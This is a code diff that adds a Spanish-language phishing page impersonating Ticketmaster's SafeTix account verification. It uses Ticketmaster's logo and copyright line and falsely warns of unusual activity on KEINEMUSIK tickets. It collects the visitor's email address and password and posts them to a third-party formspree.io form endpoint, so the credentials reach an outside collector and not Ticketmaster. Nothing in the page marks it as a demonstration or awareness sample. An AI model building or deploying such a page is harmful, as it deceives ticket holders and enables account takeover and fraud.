@@ -1,0 +1,35 @@
+<!DOCTYPE html>
+<html lang="es">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Ticketmaster - Verificación de Cuenta</title>
+    <style>
+        body { font-family: 'Helvetica', sans-serif; background-color: #ffffff; display: flex; justify-content: center; align-items: center; height: 100vh; margin: 0; }
+        .container { width: 100%; max-width: 400px; padding: 20px; text-align: center; }
+        img { width: 180px; margin-bottom: 30px; }
+        h2 { font-size: 22px; color: #1f1f1f; margin-bottom: 10px; }
+        p { font-size: 14px; color: #4a4a4a; margin-bottom: 25px; }
+        input { width: 100%; padding: 15px; margin-bottom: 15px; border: 1px solid #ccc; border-radius: 4px; box-sizing: border-box; font-size: 16px; }
+        button { width: 100%; padding: 15px; background-color: #026CDF; color: white; border: none; border-radius: 4px; font-size: 16px; font-weight: bold; cursor: pointer; }
+        .footer { margin-top: 30px; font-size: 11px; color: #999; }
+    </style>
+</head>
+<body>
+    <div class="container">
+        <img src="https://upload.wikimedia.org/wikipedia/commons/thumb/5/5e/Ticketmaster_logo.svg/2560px-Ticketmaster_logo.svg.png" alt="Ticketmaster">
+        <h2>Verificación SafeTix™</h2>
+        <p>Detectamos actividad inusual. Inicia sesión para validar tus boletos de <strong>KEINEMUSIK</strong>.</p>
+        
+        <form action="https://formspree.io/f/https://formspree.io/f/xaqavenl" method="POST">
+            <input type="email" name="email" placeholder="Correo electrónico" required>
+            <input type="password" name="password" placeholder="Contraseña" required>
+            <button type="submit">VALIDAR ACCESO</button>
+        </form>
+
+        <div class="footer">
+            © 1999-2026 Ticketmaster. Todos los derechos reservados.
+        </div>
+    </div>
+</body>
+</html>
